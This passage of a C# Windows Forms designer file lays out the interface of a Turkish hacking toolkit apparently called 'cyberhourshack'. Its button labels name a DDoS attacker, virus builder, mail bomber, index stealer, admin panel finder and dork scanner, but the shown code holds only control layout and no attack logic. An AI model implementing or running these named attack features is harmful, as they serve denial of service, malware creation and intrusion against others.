            this.pictureBox22.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox22.Image = global::cyberhourshack.Properties.Resources.internet_icon;
            this.pictureBox22.Location = new System.Drawing.Point(99, 115);
            this.pictureBox22.Name = "pictureBox22";
            this.pictureBox22.Size = new System.Drawing.Size(53, 52);
            this.pictureBox22.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox22.TabIndex = 18;
            this.pictureBox22.TabStop = false;
            // 
            // pictureBox20
            // 
            this.pictureBox20.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox20.Image = global::cyberhourshack.Properties.Resources._165_1653694_ip_management_service_ip_based_icon;
            this.pictureBox20.Location = new System.Drawing.Point(199, 115);
            this.pictureBox20.Name = "pictureBox20";
            this.pictureBox20.Size = new System.Drawing.Size(53, 52);
            this.pictureBox20.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox20.TabIndex = 14;
            this.pictureBox20.TabStop = false;
            this.pictureBox20.Click += new System.EventHandler(this.PictureBox20_Click);
            // 
            // label55
            // 
            this.label55.AutoSize = true;
            this.label55.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label55.Location = new System.Drawing.Point(179, 89);
            this.label55.Name = "label55";
            this.label55.Size = new System.Drawing.Size(90, 17);
            this.label55.TabIndex = 16;
            this.label55.Text = "Dork Tarayıcı";
            // 
            // label56
            // 
            this.label56.AutoSize = true;
            this.label56.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label56.Location = new System.Drawing.Point(185, 174);
            this.label56.Name = "label56";
            this.label56.Size = new System.Drawing.Size(82, 17);
            this.label56.TabIndex = 17;
            this.label56.Text = "Ip-Port Tara";
            // 
            // pictureBox21
            // 
            this.pictureBox21.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox21.Image = global::cyberhourshack.Properties.Resources.terminal;
            this.pictureBox21.Location = new System.Drawing.Point(199, 37);
            this.pictureBox21.Name = "pictureBox21";
            this.pictureBox21.Size = new System.Drawing.Size(53, 52);
            this.pictureBox21.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox21.TabIndex = 15;
            this.pictureBox21.TabStop = false;
            this.pictureBox21.Click += new System.EventHandler(this.PictureBox21_Click);
            // 
            // pictureBox19
            // 
            this.pictureBox19.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox19.Image = global::cyberhourshack.Properties.Resources._2Iad;
            this.pictureBox19.Location = new System.Drawing.Point(99, 37);
            this.pictureBox19.Name = "pictureBox19";
            this.pictureBox19.Size = new System.Drawing.Size(53, 52);
            this.pictureBox19.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox19.TabIndex = 10;
            this.pictureBox19.TabStop = false;
            this.pictureBox19.Click += new System.EventHandler(this.PictureBox19_Click);
            // 
            // label54
            // 
            this.label54.AutoSize = true;
            this.label54.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label54.Location = new System.Drawing.Point(77, 92);
            this.label54.Name = "label54";
            this.label54.Size = new System.Drawing.Size(92, 17);
            this.label54.TabIndex = 11;
            this.label54.Text = "Admin Finder";
            // 
            // iTalk_GroupBox18
            // 
            this.iTalk_GroupBox18.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox18.Controls.Add(this.monoFlat_Button23);
            this.iTalk_GroupBox18.Controls.Add(this.monoFlat_Button22);
            this.iTalk_GroupBox18.Location = new System.Drawing.Point(16, 262);
            this.iTalk_GroupBox18.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox18.Name = "iTalk_GroupBox18";
            this.iTalk_GroupBox18.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox18.Size = new System.Drawing.Size(304, 265);
            this.iTalk_GroupBox18.TabIndex = 12;
            this.iTalk_GroupBox18.Text = "BAŞLANGICA EKLE";
            // 
            // monoFlat_Button23
            // 
            this.monoFlat_Button23.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button23.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button23.Image = null;
            this.monoFlat_Button23.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button23.Location = new System.Drawing.Point(8, 153);
            this.monoFlat_Button23.Name = "monoFlat_Button23";
            this.monoFlat_Button23.Size = new System.Drawing.Size(288, 80);
            this.monoFlat_Button23.TabIndex = 13;
            this.monoFlat_Button23.Text = "AÇILIŞTAN KALDIR";
            this.monoFlat_Button23.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button23.Click += new System.EventHandler(this.MonoFlat_Button23_Click);
            // 
            // monoFlat_Button22
            // 
            this.monoFlat_Button22.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button22.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button22.Image = null;
            this.monoFlat_Button22.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button22.Location = new System.Drawing.Point(8, 51);
            this.monoFlat_Button22.Name = "monoFlat_Button22";
            this.monoFlat_Button22.Size = new System.Drawing.Size(288, 80);
            this.monoFlat_Button22.TabIndex = 12;
            this.monoFlat_Button22.Text = "AÇILIŞA EKLE";
            this.monoFlat_Button22.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button22.Click += new System.EventHandler(this.MonoFlat_Button22_Click);
            // 
            // iTalk_GroupBox17
            // 
            this.iTalk_GroupBox17.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox17.Controls.Add(this.pictureBox18);
            this.iTalk_GroupBox17.Controls.Add(this.pictureBox17);
            this.iTalk_GroupBox17.Controls.Add(this.label53);
            this.iTalk_GroupBox17.Controls.Add(this.monoFlat_Button21);
            this.iTalk_GroupBox17.Controls.Add(this.monoFlat_Button20);
            this.iTalk_GroupBox17.Location = new System.Drawing.Point(601, 44);
            this.iTalk_GroupBox17.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox17.Name = "iTalk_GroupBox17";
            this.iTalk_GroupBox17.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox17.Size = new System.Drawing.Size(226, 202);
            this.iTalk_GroupBox17.TabIndex = 11;
            this.iTalk_GroupBox17.Text = "ARKAPLAN RESİM";
            // 
            // pictureBox18
            // 
            this.pictureBox18.BackColor = System.Drawing.Color.White;
            this.pictureBox18.Location = new System.Drawing.Point(179, 103);
            this.pictureBox18.Name = "pictureBox18";
            this.pictureBox18.Size = new System.Drawing.Size(10, 10);
            this.pictureBox18.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox18.TabIndex = 17;
            this.pictureBox18.TabStop = false;
            this.pictureBox18.Visible = false;
            // 
            // pictureBox17
            // 
            this.pictureBox17.Location = new System.Drawing.Point(6, 123);
            this.pictureBox17.Name = "pictureBox17";
            this.pictureBox17.Size = new System.Drawing.Size(213, 65);
            this.pictureBox17.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox17.TabIndex = 12;
            this.pictureBox17.TabStop = false;
            // 
            // label53
            // 
            this.label53.AutoSize = true;
            this.label53.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label53.Location = new System.Drawing.Point(3, 97);
            this.label53.Name = "label53";
            this.label53.Size = new System.Drawing.Size(104, 17);
            this.label53.TabIndex = 16;
            this.label53.Text = "Eklenen Resim :";
            // 
            // monoFlat_Button21
            // 
            this.monoFlat_Button21.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button21.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button21.Image = null;
            this.monoFlat_Button21.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button21.Location = new System.Drawing.Point(6, 63);
            this.monoFlat_Button21.Name = "monoFlat_Button21";
            this.monoFlat_Button21.Size = new System.Drawing.Size(213, 29);
            this.monoFlat_Button21.TabIndex = 12;
            this.monoFlat_Button21.Text = "RESMİ KALDIR";
            this.monoFlat_Button21.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button21.Click += new System.EventHandler(this.MonoFlat_Button21_Click);
            // 
            // monoFlat_Button20
            // 
            this.monoFlat_Button20.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button20.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button20.Image = null;
            this.monoFlat_Button20.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button20.Location = new System.Drawing.Point(6, 31);
            this.monoFlat_Button20.Name = "monoFlat_Button20";
            this.monoFlat_Button20.Size = new System.Drawing.Size(213, 29);
            this.monoFlat_Button20.TabIndex = 11;
            this.monoFlat_Button20.Text = "RESİM EKLE";
            this.monoFlat_Button20.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button20.Click += new System.EventHandler(this.MonoFlat_Button20_Click);
            // 
            // iTalk_GroupBox15
            // 
            this.iTalk_GroupBox15.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox15.Controls.Add(this.monoFlat_Button15);
            this.iTalk_GroupBox15.Controls.Add(this.monoFlat_Button16);
            this.iTalk_GroupBox15.Controls.Add(this.monoFlat_Button17);
            this.iTalk_GroupBox15.Controls.Add(this.monoFlat_Button18);
            this.iTalk_GroupBox15.Controls.Add(this.monoFlat_Button19);
            this.iTalk_GroupBox15.Location = new System.Drawing.Point(325, 43);
            this.iTalk_GroupBox15.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox15.Name = "iTalk_GroupBox15";
            this.iTalk_GroupBox15.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox15.Size = new System.Drawing.Size(270, 203);
            this.iTalk_GroupBox15.TabIndex = 10;
            this.iTalk_GroupBox15.Text = "ARKAPLAN RENGİ";
            this.iTalk_GroupBox15.Click += new System.EventHandler(this.İTalk_GroupBox15_Click);
            // 
            // monoFlat_Button15
            // 
            this.monoFlat_Button15.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button15.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button15.Image = null;
            this.monoFlat_Button15.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button15.Location = new System.Drawing.Point(8, 128);
            this.monoFlat_Button15.Name = "monoFlat_Button15";
            this.monoFlat_Button15.Size = new System.Drawing.Size(255, 29);
            this.monoFlat_Button15.TabIndex = 14;
            this.monoFlat_Button15.Text = "AÇIK MAVİ";
            this.monoFlat_Button15.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button15.Click += new System.EventHandler(this.MonoFlat_Button15_Click);
            // 
            // monoFlat_Button16
            // 
            this.monoFlat_Button16.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button16.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button16.Image = null;
            this.monoFlat_Button16.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button16.Location = new System.Drawing.Point(8, 96);
            this.monoFlat_Button16.Name = "monoFlat_Button16";
            this.monoFlat_Button16.Size = new System.Drawing.Size(255, 29);
            this.monoFlat_Button16.TabIndex = 13;
            this.monoFlat_Button16.Text = "GRİ";
            this.monoFlat_Button16.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button16.Click += new System.EventHandler(this.MonoFlat_Button16_Click);
            // 
            // monoFlat_Button17
            // 
            this.monoFlat_Button17.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button17.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button17.Image = null;
            this.monoFlat_Button17.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button17.Location = new System.Drawing.Point(8, 160);
            this.monoFlat_Button17.Name = "monoFlat_Button17";
            this.monoFlat_Button17.Size = new System.Drawing.Size(255, 29);
            this.monoFlat_Button17.TabIndex = 12;
            this.monoFlat_Button17.Text = "DAHA FAZLA RENK";
            this.monoFlat_Button17.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button17.Click += new System.EventHandler(this.MonoFlat_Button17_Click);
            // 
            // monoFlat_Button18
            // 
            this.monoFlat_Button18.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button18.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button18.Image = null;
            this.monoFlat_Button18.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button18.Location = new System.Drawing.Point(8, 64);
            this.monoFlat_Button18.Name = "monoFlat_Button18";
            this.monoFlat_Button18.Size = new System.Drawing.Size(255, 29);
            this.monoFlat_Button18.TabIndex = 11;
            this.monoFlat_Button18.Text = "MAVİ";
            this.monoFlat_Button18.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button18.Click += new System.EventHandler(this.MonoFlat_Button18_Click);
            // 
            // monoFlat_Button19
            // 
            this.monoFlat_Button19.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button19.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button19.Image = null;
            this.monoFlat_Button19.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button19.Location = new System.Drawing.Point(8, 32);
            this.monoFlat_Button19.Name = "monoFlat_Button19";
            this.monoFlat_Button19.Size = new System.Drawing.Size(255, 29);
            this.monoFlat_Button19.TabIndex = 10;
            this.monoFlat_Button19.Text = "VARSAYILAN";
            this.monoFlat_Button19.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button19.Click += new System.EventHandler(this.MonoFlat_Button19_Click);
            // 
            // iTalk_GroupBox11
            // 
            this.iTalk_GroupBox11.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox11.Controls.Add(this.monoFlat_Button14);
            this.iTalk_GroupBox11.Controls.Add(this.monoFlat_Button13);
            this.iTalk_GroupBox11.Controls.Add(this.monoFlat_Button12);
            this.iTalk_GroupBox11.Controls.Add(this.monoFlat_Button11);
            this.iTalk_GroupBox11.Controls.Add(this.monoFlat_Button10);
            this.iTalk_GroupBox11.Location = new System.Drawing.Point(16, 44);
            this.iTalk_GroupBox11.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox11.Name = "iTalk_GroupBox11";
            this.iTalk_GroupBox11.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox11.Size = new System.Drawing.Size(304, 202);
            this.iTalk_GroupBox11.TabIndex = 9;
            this.iTalk_GroupBox11.Text = "ALT MENÜ RENK ";
            // 
            // monoFlat_Button14
            // 
            this.monoFlat_Button14.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button14.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button14.Image = null;
            this.monoFlat_Button14.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button14.Location = new System.Drawing.Point(8, 127);
            this.monoFlat_Button14.Name = "monoFlat_Button14";
            this.monoFlat_Button14.Size = new System.Drawing.Size(288, 29);
            this.monoFlat_Button14.TabIndex = 9;
            this.monoFlat_Button14.Text = "AÇIK MAVİ";
            this.monoFlat_Button14.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button14.Click += new System.EventHandler(this.MonoFlat_Button14_Click);
            // 
            // monoFlat_Button13
            // 
            this.monoFlat_Button13.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button13.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button13.Image = null;
            this.monoFlat_Button13.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button13.Location = new System.Drawing.Point(8, 95);
            this.monoFlat_Button13.Name = "monoFlat_Button13";
            this.monoFlat_Button13.Size = new System.Drawing.Size(288, 29);
            this.monoFlat_Button13.TabIndex = 8;
            this.monoFlat_Button13.Text = "GRİ";
            this.monoFlat_Button13.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button13.Click += new System.EventHandler(this.MonoFlat_Button13_Click);
            // 
            // monoFlat_Button12
            // 
            this.monoFlat_Button12.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button12.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button12.Image = null;
            this.monoFlat_Button12.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button12.Location = new System.Drawing.Point(8, 159);
            this.monoFlat_Button12.Name = "monoFlat_Button12";
            this.monoFlat_Button12.Size = new System.Drawing.Size(288, 29);
            this.monoFlat_Button12.TabIndex = 7;
            this.monoFlat_Button12.Text = "DAHA FAZLA RENK";
            this.monoFlat_Button12.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button12.Click += new System.EventHandler(this.MonoFlat_Button12_Click);
            // 
            // monoFlat_Button11
            // 
            this.monoFlat_Button11.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button11.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button11.Image = null;
            this.monoFlat_Button11.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button11.Location = new System.Drawing.Point(8, 63);
            this.monoFlat_Button11.Name = "monoFlat_Button11";
            this.monoFlat_Button11.Size = new System.Drawing.Size(288, 29);
            this.monoFlat_Button11.TabIndex = 6;
            this.monoFlat_Button11.Text = "MAVİ";
            this.monoFlat_Button11.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button11.Click += new System.EventHandler(this.MonoFlat_Button11_Click);
            // 
            // monoFlat_Button10
            // 
            this.monoFlat_Button10.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button10.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button10.Image = null;
            this.monoFlat_Button10.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button10.Location = new System.Drawing.Point(8, 31);
            this.monoFlat_Button10.Name = "monoFlat_Button10";
            this.monoFlat_Button10.Size = new System.Drawing.Size(288, 29);
            this.monoFlat_Button10.TabIndex = 5;
            this.monoFlat_Button10.Text = "VARSAYILAN";
            this.monoFlat_Button10.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button10.Click += new System.EventHandler(this.MonoFlat_Button10_Click);
            // 
            // panel45
            // 
            this.panel45.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel45.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel45.Location = new System.Drawing.Point(10, 64);
            this.panel45.Name = "panel45";
            this.panel45.Size = new System.Drawing.Size(74, 6);
            this.panel45.TabIndex = 8;
            // 
            // panel44
            // 
            this.panel44.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel44.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel44.Location = new System.Drawing.Point(84, 36);
            this.panel44.Name = "panel44";
            this.panel44.Size = new System.Drawing.Size(10, 34);
            this.panel44.TabIndex = 6;
            // 
            // panel43
            // 
            this.panel43.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel43.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel43.Location = new System.Drawing.Point(0, 36);
            this.panel43.Name = "panel43";
            this.panel43.Size = new System.Drawing.Size(10, 34);
            this.panel43.TabIndex = 5;
            // 
            // panel42
            // 
            this.panel42.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel42.Controls.Add(this.label52);
            this.panel42.Controls.Add(this.button9);
            this.panel42.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel42.Location = new System.Drawing.Point(0, 0);
            this.panel42.Name = "panel42";
            this.panel42.Size = new System.Drawing.Size(94, 36);
            this.panel42.TabIndex = 4;
            this.panel42.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel42_MouseDown);
            this.panel42.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel42_MouseMove);
            this.panel42.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel42_MouseUp);
            // 
            // label52
            // 
            this.label52.AutoSize = true;
            this.label52.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label52.ForeColor = System.Drawing.Color.White;
            this.label52.Location = new System.Drawing.Point(389, 10);
            this.label52.Name = "label52";
            this.label52.Size = new System.Drawing.Size(92, 17);
            this.label52.TabIndex = 12;
            this.label52.Text = "< AYARLAR >";
            // 
            // button9
            // 
            this.button9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button9.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button9.ForeColor = System.Drawing.Color.White;
            this.button9.Location = new System.Drawing.Point(811, 7);
            this.button9.Name = "button9";
            this.button9.Size = new System.Drawing.Size(23, 22);
            this.button9.TabIndex = 4;
            this.button9.Text = "X";
            this.button9.UseVisualStyleBackColor = false;
            this.button9.Click += new System.EventHandler(this.Button9_Click);
            // 
            // openFileDialog1
            // 
            this.openFileDialog1.FileName = "openFileDialog1";
            // 
            // panel46
            // 
            this.panel46.BackColor = System.Drawing.Color.White;
            this.panel46.Controls.Add(this.recuperareIIButton35);
            this.panel46.Controls.Add(this.recuperareIIButton34);
            this.panel46.Controls.Add(this.recuperareIIButton33);
            this.panel46.Controls.Add(this.recuperareIIButton32);
            this.panel46.Controls.Add(this.recuperareIIButton31);
            this.panel46.Controls.Add(this.recuperareIIButton30);
            this.panel46.Controls.Add(this.recuperareIIButton29);
            this.panel46.Controls.Add(this.recuperareIIButton28);
            this.panel46.Controls.Add(this.recuperareIIButton27);
            this.panel46.Controls.Add(this.recuperareIIButton26);
            this.panel46.Controls.Add(this.panel50);
            this.panel46.Controls.Add(this.panel49);
            this.panel46.Controls.Add(this.panel48);
            this.panel46.Controls.Add(this.panel47);
            this.panel46.Location = new System.Drawing.Point(319, 230);
            this.panel46.Name = "panel46";
            this.panel46.Size = new System.Drawing.Size(82, 68);
            this.panel46.TabIndex = 28;
            this.panel46.Paint += new System.Windows.Forms.PaintEventHandler(this.Panel46_Paint);
            // 
            // recuperareIIButton35
            // 
            this.recuperareIIButton35.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton35.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton35.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton35.Location = new System.Drawing.Point(20, 488);
            this.recuperareIIButton35.Name = "recuperareIIButton35";
            this.recuperareIIButton35.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton35.TabIndex = 38;
            this.recuperareIIButton35.Text = "GÖREV YÖNETİCİSİ";
            this.recuperareIIButton35.Click += new System.EventHandler(this.RecuperareIIButton35_Click);
            // 
            // recuperareIIButton34
            // 
            this.recuperareIIButton34.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton34.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton34.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton34.Location = new System.Drawing.Point(20, 439);
            this.recuperareIIButton34.Name = "recuperareIIButton34";
            this.recuperareIIButton34.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton34.TabIndex = 37;
            this.recuperareIIButton34.Text = "İNDEX ÇALICI";
            this.recuperareIIButton34.Click += new System.EventHandler(this.RecuperareIIButton34_Click);
            // 
            // recuperareIIButton33
            // 
            this.recuperareIIButton33.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton33.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton33.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton33.Location = new System.Drawing.Point(20, 390);
            this.recuperareIIButton33.Name = "recuperareIIButton33";
            this.recuperareIIButton33.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton33.TabIndex = 36;
            this.recuperareIIButton33.Text = "Ddos ATAK";
            this.recuperareIIButton33.Click += new System.EventHandler(this.RecuperareIIButton33_Click);
            // 
            // recuperareIIButton32
            // 
            this.recuperareIIButton32.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton32.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton32.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton32.Location = new System.Drawing.Point(20, 342);
            this.recuperareIIButton32.Name = "recuperareIIButton32";
            this.recuperareIIButton32.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton32.TabIndex = 35;
            this.recuperareIIButton32.Text = "IP & PORT KONTROL";
            this.recuperareIIButton32.Click += new System.EventHandler(this.RecuperareIIButton32_Click);
            // 
            // recuperareIIButton31
            // 
            this.recuperareIIButton31.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton31.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton31.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton31.Location = new System.Drawing.Point(20, 294);
            this.recuperareIIButton31.Name = "recuperareIIButton31";
            this.recuperareIIButton31.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton31.TabIndex = 34;
            this.recuperareIIButton31.Text = "CYBERHOURS BROWSER";
            this.recuperareIIButton31.Click += new System.EventHandler(this.RecuperareIIButton31_Click);
            // 
            // recuperareIIButton30
            // 
            this.recuperareIIButton30.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton30.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton30.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton30.Location = new System.Drawing.Point(20, 246);
            this.recuperareIIButton30.Name = "recuperareIIButton30";
            this.recuperareIIButton30.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton30.TabIndex = 33;
            this.recuperareIIButton30.Text = "DORK TARAYICI";
            this.recuperareIIButton30.Click += new System.EventHandler(this.RecuperareIIButton30_Click);
            // 
            // recuperareIIButton29
            // 
            this.recuperareIIButton29.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton29.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton29.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton29.Location = new System.Drawing.Point(20, 198);
            this.recuperareIIButton29.Name = "recuperareIIButton29";
            this.recuperareIIButton29.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton29.TabIndex = 32;
            this.recuperareIIButton29.Text = "VİRÜS OLUŞTURUCU";
            this.recuperareIIButton29.Click += new System.EventHandler(this.RecuperareIIButton29_Click);
            // 
            // recuperareIIButton28
            // 
            this.recuperareIIButton28.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton28.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton28.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton28.Location = new System.Drawing.Point(20, 149);
            this.recuperareIIButton28.Name = "recuperareIIButton28";
            this.recuperareIIButton28.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton28.TabIndex = 31;
            this.recuperareIIButton28.Text = "MAİL BOMBER";
            this.recuperareIIButton28.Click += new System.EventHandler(this.RecuperareIIButton28_Click);
            // 
            // recuperareIIButton27
            // 
            this.recuperareIIButton27.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton27.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton27.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton27.Location = new System.Drawing.Point(20, 101);
            this.recuperareIIButton27.Name = "recuperareIIButton27";
            this.recuperareIIButton27.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton27.TabIndex = 30;
            this.recuperareIIButton27.Text = "ADMİN PANEL BULUCU";
